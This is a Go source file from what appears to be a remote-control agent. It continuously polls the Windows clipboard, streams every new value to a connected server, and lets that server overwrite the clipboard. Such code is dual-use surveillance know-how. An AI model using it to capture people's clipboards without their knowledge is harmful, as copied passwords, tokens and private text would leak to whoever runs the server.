//go:build windows

package handlers

import (
	"context"
	"log"
	"syscall"
	"time"
	"unicode/utf8"
	"unsafe"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wininterop"
	"overlord-client/cmd/agent/wire"

	"golang.org/x/sys/windows"
)

func clipboardCallError(callErr error, fallback error) error {
	if callErr == nil {
		return fallback
	}
	if errno, ok := callErr.(syscall.Errno); ok && errno == 0 {
		return fallback
	}
	return callErr
}

var (
	cbUser32                       = windows.NewLazySystemDLL("user32.dll")
	cbKernel32                     = windows.NewLazySystemDLL("kernel32.dll")
	procOpenClipboardCB            = cbUser32.NewProc("OpenClipboard")
	procCloseClipboardCB           = cbUser32.NewProc("CloseClipboard")
	procGetClipboardCB             = cbUser32.NewProc("GetClipboardData")
	procEmptyClipboard             = cbUser32.NewProc("EmptyClipboard")
	procSetClipboardData           = cbUser32.NewProc("SetClipboardData")
	procIsClipboardFormatAvailable = cbUser32.NewProc("IsClipboardFormatAvailable")
	procGlobalAllocCB              = cbKernel32.NewProc("GlobalAlloc")
	procGlobalFreeCB               = cbKernel32.NewProc("GlobalFree")
	procGlobalSizeCB               = cbKernel32.NewProc("GlobalSize")
	procGlobalLockCB               = cbKernel32.NewProc("GlobalLock")
	procGlobalUnlockCB             = cbKernel32.NewProc("GlobalUnlock")
	procRtlMoveMemory              = cbKernel32.NewProc("RtlMoveMemory")
)

const (
	cbCFUnicodeText = 13
	cbGMEMMoveable  = 0x0002
)

func openClipboardWithRetry(ctx context.Context) error {
	var lastErr error
	for attempt := 0; attempt < 8; attempt++ {
		r, _, callErr := procOpenClipboardCB.Call(0)
		if r != 0 {
			return nil
		}
		lastErr = clipboardCallError(callErr, windows.ERROR_ACCESS_DENIED)
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(time.Duration(attempt+1) * 10 * time.Millisecond):
		}
	}
	if lastErr == nil {
		lastErr = windows.ERROR_ACCESS_DENIED
	}
	return lastErr
}

func clipboardSyncRead(ctx context.Context) (string, error) {
	available, _, _ := procIsClipboardFormatAvailable.Call(cbCFUnicodeText)
	if available == 0 {
		return "", nil
	}
	if err := openClipboardWithRetry(ctx); err != nil {
		return "", err
	}
	defer procCloseClipboardCB.Call()
	h, _, callErr := procGetClipboardCB.Call(cbCFUnicodeText)
	if h == 0 {
		return "", clipboardCallError(callErr, windows.ERROR_INVALID_HANDLE)
	}
	ptr, _, callErr := procGlobalLockCB.Call(h)
	if ptr == 0 {
		return "", clipboardCallError(callErr, windows.ERROR_LOCK_FAILED)
	}
	defer procGlobalUnlockCB.Call(h)
	allocationBytes, _, _ := procGlobalSizeCB.Call(h)
	if allocationBytes < 2 {
		return "", nil
	}
	maxUnits := int(allocationBytes / 2)
	if maxUnits > 1<<20 {
		maxUnits = 1 << 20
	}
	n := 0
	for n < maxUnits {
		v := *(*uint16)(wininterop.Pointer(ptr + uintptr(n)*2))
		if v == 0 {
			break
		}
		n++
	}
	u16 := unsafe.Slice((*uint16)(wininterop.Pointer(ptr)), n)
	return windows.UTF16ToString(u16), nil
}

func clipboardSyncWrite(ctx context.Context, text string) error {
	if err := openClipboardWithRetry(ctx); err != nil {
		return err
	}
	defer procCloseClipboardCB.Call()

	if r, _, callErr := procEmptyClipboard.Call(); r == 0 {
		return clipboardCallError(callErr, windows.ERROR_ACCESS_DENIED)
	}

	utf16, err := windows.UTF16FromString(text)
	if err != nil {
		return err
	}
	size := len(utf16) * 2

	hMem, _, _ := procGlobalAllocCB.Call(cbGMEMMoveable, uintptr(size))
	if hMem == 0 {
		return windows.ERROR_NOT_ENOUGH_MEMORY
	}

	ptr, _, _ := procGlobalLockCB.Call(hMem)
	if ptr == 0 {
		procGlobalFreeCB.Call(hMem)
		return windows.ERROR_LOCK_FAILED
	}

	procRtlMoveMemory.Call(ptr, uintptr(unsafe.Pointer(&utf16[0])), uintptr(size))
	procGlobalUnlockCB.Call(hMem)

	r, _, callErr := procSetClipboardData.Call(cbCFUnicodeText, hMem)
	if r == 0 {
		procGlobalFreeCB.Call(hMem)
		return clipboardCallError(callErr, windows.ERROR_ACCESS_DENIED)
	}
	return nil
}

func sendClipboardContent(ctx context.Context, env *runtime.Env, source, content string) error {
	text := content
	if len(text) > 64*1024 {
		text = text[:64*1024]
		for len(text) > 0 && !utf8.ValidString(text) {
			text = text[:len(text)-1]
		}
	}
	return wire.WriteMsg(ctx, env.Conn, wire.ClipboardContent{
		Type: "clipboard_content", Text: text, Source: source,
	})
}

func ClipboardSyncStart(ctx context.Context, env *runtime.Env, source string) {
	log.Printf("clipboard_sync: starting (%s)", source)
	defer log.Printf("clipboard_sync: stopped (%s)", source)

	ticker := time.NewTicker(750 * time.Millisecond)
	defer ticker.Stop()

	var lastContent string
	hasLastContent := false

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}
		content, err := clipboardSyncRead(ctx)
		if err != nil {
			log.Printf("clipboard_sync: read failed: %v", err)
			continue
		}
		if hasLastContent && content == lastContent {
			continue
		}
		lastContent = content
		hasLastContent = true
		if err := sendClipboardContent(ctx, env, source, content); err != nil {
			log.Printf("clipboard_sync: send failed: %v", err)
		}
	}
}

func ClipboardSyncGet(ctx context.Context, env *runtime.Env, source string) error {
	text, err := clipboardSyncRead(ctx)
	if err != nil {
		return err
	}
	return sendClipboardContent(ctx, env, source, text)
}

func ClipboardSyncSet(ctx context.Context, text string) error {
	if len(text) > 64*1024 {
		text = text[:64*1024]
		for len(text) > 0 && !utf8.ValidString(text) {
			text = text[:len(text)-1]
		}
	}
	return clipboardSyncWrite(ctx, text)
}
